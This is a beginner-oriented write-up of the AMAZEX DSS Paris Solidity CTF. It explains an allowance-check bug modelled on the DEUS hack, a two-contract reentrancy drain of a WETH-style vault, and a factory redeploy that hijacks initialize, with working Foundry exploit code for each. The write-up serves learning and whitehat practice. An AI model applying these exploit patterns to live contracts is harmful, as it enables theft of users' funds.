# BeginnerLevel-AMAZEX-DSS-PARIS-Writeup
Documents my thinking process on how i solved this CTF in a way that is beginner friendly to understand


## Challenge 1


After a careful view of the contract, reading about the $DEI attack [here](https://cointelegraph.com/news/deus-finance-loses-6m-following-stablecoin-hack)
(I just read the first 5 paragraphs)

I realized that our contract is identical to the one that was hacked ( DEUS )

So, in order to get the balance back from Hacker, we need some kind of way to take tokens back from the exploiter

The `deposit` function does not do any good,`withdraw` gets our tokens in the form of eth(but we don't have any as of now)

`burn` just burns our tokens, but here is a special function `burnFrom` that burns tokens on behalf of someone

After 15 minutes of observance, I noticed something, a miscalculation.

Instead of checking the allowance given by us by the exploiter account,
The MagicEth contract checks for our allowance to the exploiter

```solidity
uint256 currentAllowance = allowance(msg.sender, account);

```

So I thought of the following scenario,

 -> Approve tokens to exploiter, burn his tokens (but how do we get that tokens ? )
So, I found another vulnerability

```solidity
require(currentAllowance >= amount, "ERC20: insufficient allowance");
_approve(account, msg.sender, currentAllowance - amount);

```
  
These lines are gems!

They say that the amount sent is less than the current allowance.

So if we manipulate the `amount` and `currentAllowance` in a way that Exploiter approves us of all his tokens ( 1000 magic ether )

, We will be the Goat

So I did simple mathematics.

After a number of trials, I got a strategy!

What if we approve 1_000_000 tokens to the exploiter, call `burnFrom` function with `amount` to be `1000 ether`.

Here it goes 

```solidity
mETH.approve(exploiter,1000000 ether);
mETH.burnFrom(exploiter,1000 ether);
```

What approve will do ?

It will pass this check 

```solidity
require(currentAllowance >= amount, "ERC20: insufficient allowance");

```

what `1000 ether` as `amount` will do ?

it will help use this line and approve us 1000 ether from `exploiter`'s account.

```solidity
_approve(account, msg.sender, currentAllowance - amount);

```

No, it will burn all the tokens from the hacker's account equal to `amount` which is `1000 ether` and emit an event.

**Note:-** Burning all tokens will essentially mean totalSuppply is zero.

Let's withdraw our 1000 ether by calling `withdraw` that hacker has burned but did not withdraw : )

So essentially contract balance is still 1000 ether !

Oops , we got a division by zero error 

```solidity
        uint256 _value = address(this).balance * amount / totalSupply();

```
took me some time to think why division by zero , remember the Note statement, totalSupply is zero.


So we now have two challenges in front of us!

1. Make total supply greater than zero
2. make sure we withdraw each penny out of contract

for this we need to do task 1 first .

let's borrow one Ether from foundry ,

```solidity
vm.deal(whitehat, 1 ether);
```

Deposit in the contract

```solidity
mETH.deposit{value: 1 ether}();
```

Now totalSupply is `1 ether`.

Let's do task 2 .

In order to ensure that `_value` contains the `1000 ether` value , what should we pass ?

Let's do some elementary maths.

_value=1000ether * amount / 1 ether 

or 

_value=1000ether * amount / totalSupply()

what should we pass in amount so that the part `amount / totalSupply()` gets cancelled and only `1000 ether` lefts.

Think for a second !

Yes , You are right!!! if you pass `totalSupply()` amount as amount then `totalSupply()/totalSupply()` will cancel out !
Clever Job !


```solidity
mETH.withdraw(mETH.totalSupply());
```
So we are done with it .

We Got our `1000 ether` yeyyy 🎉🥳🥳

But wait a sec , we have 1001 ETH !

We need to give back what we took !

So on Foundry , i just burned it and now i have 1000 ether and we have successfully recovered it :)

```solidity
payable(0).transfer(1 ether);
```

Yes man !

You did it , You just understood and solved Challenge1 of latest Secuereum CTF.

That's a good step in your career.

Give a tap on your back.

I hope you got the value worth of your time.

If you liked it , Thank you !

And Move onto Challenge 2 [Here](https://)


## Challenge 2

```solidity

interface IModernEth {
    function deposit() external payable;

    function withdraw(uint256 wad) external;

    function withdrawAll() external;

    function balanceOf(address) external view returns (uint);

    function transfer(address, uint) external;
}

contract Attack {
    ModernWETH public etherVault;
    // IModernEth public immutable etherVault;
    Attack public attackPeer;

    address private attacker;

    constructor(ModernWETH _etherVault,address _attacker) {
        etherVault = _etherVault;
        attacker=_attacker;
    }

    function setAttackPeer(Attack _attackPeer) external {
        attackPeer = _attackPeer;
    }
    function withdraw()external{
        require(msg.sender==attacker,"Only Attacker can call this function");
        payable(attacker).transfer(address(this).balance);
    }
    receive() external payable {
        payable(attacker).transfer(address(this).balance-1 ether);
        if (address(etherVault).balance >= 1 ether) {
            etherVault.transfer(
                address(attackPeer),
                etherVault.balanceOf(address(this))
            );
        }
    }

    function attackInit() external payable {
        if(msg.value >= 1 ether){
        etherVault.deposit{value: 1 ether}();
        etherVault.withdrawAll();        
        }
        
    }

    function attackNext() external {
        etherVault.withdrawAll();
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

```solidity
function testWhitehatRescue() public {
        vm.startPrank(whitehat, whitehat);
        uint whitehatBalanceBefore=whitehat.balance;

        Attack attacker1 = new Attack(modernWETH,whitehat);
        Attack attacker2 = new Attack(modernWETH,whitehat);
        attacker1.setAttackPeer(attacker2);
        attacker2.setAttackPeer(attacker1);
        uint totalBalanceRemaining=address(modernWETH).balance;
        for (uint i = 1; totalBalanceRemaining>10 ether; i++) {

            if (i % 2 == 0) {
                attacker1.attackInit{value: 1 ether}();
                attacker2.attackNext();
            } else {
                attacker2.attackInit{value: 1 ether}();
                attacker1.attackNext();
            }
            totalBalanceRemaining=address(modernWETH).balance;
            // console.log("Total Balance Remaining",totalBalanceRemaining);
        }
        attacker1.withdraw();
        attacker2.withdraw();
        
        uint whitehatBalanceAfter=whitehat.balance;
        uint totalRecovered=(whitehatBalanceAfter-whitehatBalanceBefore)/10**18;
        console.log("Total recovered ",totalRecovered," ETH");
        totalBalanceRemaining=address(modernWETH).balance/10**18;
        // console.log("Total Balance still locked in contract ",totalBalanceRemaining);
        console.log("Percentage Recovered",(totalRecovered*100/1000) ,"%");

    }
    
```

## Result

![image](https://github.com/0xumarkhatab/BeginnerLevel-AMAZEX-DSS-PARIS-Writeup/assets/71306738/877909f1-67e2-40ba-9cc8-8a1e6fa3f4d4)



# Challenge 4

```solidity

   function testWhitehatRescue() public {
        vm.deal(whitehat, 10 ether);
        vm.startPrank(whitehat, whitehat);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge4Test -vvvv //
        ////////////////////////////////////////////////////*/


        address adr = FACTORY.deploy( type(VaultWalletTemplate).creationCode, 11);
        console.log("Deployed address is ",adr);
        console.log("balance is ",POSI.balanceOf(adr));
        IVaultWalletTemplate(adr).initialize(address(whitehat));

        IVaultWalletTemplate(adr).withdrawERC20(address(POSI),POSI.balanceOf(adr),whitehat);
        POSI.transfer(devs,POSI.balanceOf(whitehat));

        //==================================================//
        vm.stopPrank();

        assertEq(POSI.balanceOf(devs), 1000 ether, "devs' POSI balance should be 1000 POSI");
    }

```

## Result
![image](https://github.com/0xumarkhatab/BeginnerLevel-AMAZEX-DSS-PARIS-Writeup/assets/71306738/fc9f8338-963c-42ac-8c11-c7956be0dd83)

